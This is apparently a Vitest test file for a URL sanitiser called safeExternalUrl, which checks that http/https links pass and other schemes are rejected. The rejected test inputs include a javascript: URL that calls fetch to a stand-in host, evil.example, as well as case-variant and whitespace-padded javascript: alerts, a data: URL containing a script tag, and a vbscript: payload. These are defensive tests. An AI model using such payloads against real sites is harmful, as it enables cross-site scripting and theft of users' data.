import { describe, expect, it } from "vitest";
import { safeExternalUrl } from "./url";

describe("safeExternalUrl", () => {
  it("allows https URLs", () => {
    expect(safeExternalUrl("https://example.com/page")).toBe(
      "https://example.com/page"
    );
  });

  it("allows http URLs", () => {
    expect(safeExternalUrl("http://example.com")).toBe("http://example.com");
  });

  it("blocks javascript: URLs", () => {
    expect(
      safeExternalUrl("javascript:fetch('https://evil.example/?t=1')")
    ).toBeNull();
  });

  it("blocks case-variant javascript: URLs", () => {
    expect(safeExternalUrl("JaVaScRiPt:alert(1)")).toBeNull();
  });

  it("blocks javascript: URLs with leading whitespace", () => {
    expect(safeExternalUrl("   javascript:alert(1)")).toBeNull();
  });

  it("blocks data: URLs", () => {
    expect(safeExternalUrl("data:text/html,<script>alert(1)</script>")).toBeNull();
  });

  it("blocks vbscript: URLs", () => {
    expect(safeExternalUrl("vbscript:msgbox(1)")).toBeNull();
  });

  it("blocks relative paths and bare strings", () => {
    expect(safeExternalUrl("/brandon")).toBeNull();
    expect(safeExternalUrl("example.com")).toBeNull();
    expect(safeExternalUrl("//example.com/x")).toBeNull();
  });

  it("returns null for empty / non-string input", () => {
    expect(safeExternalUrl("")).toBeNull();
    expect(safeExternalUrl("   ")).toBeNull();
    expect(safeExternalUrl(null)).toBeNull();
    expect(safeExternalUrl(undefined)).toBeNull();
    expect(safeExternalUrl(42)).toBeNull();
  });
});
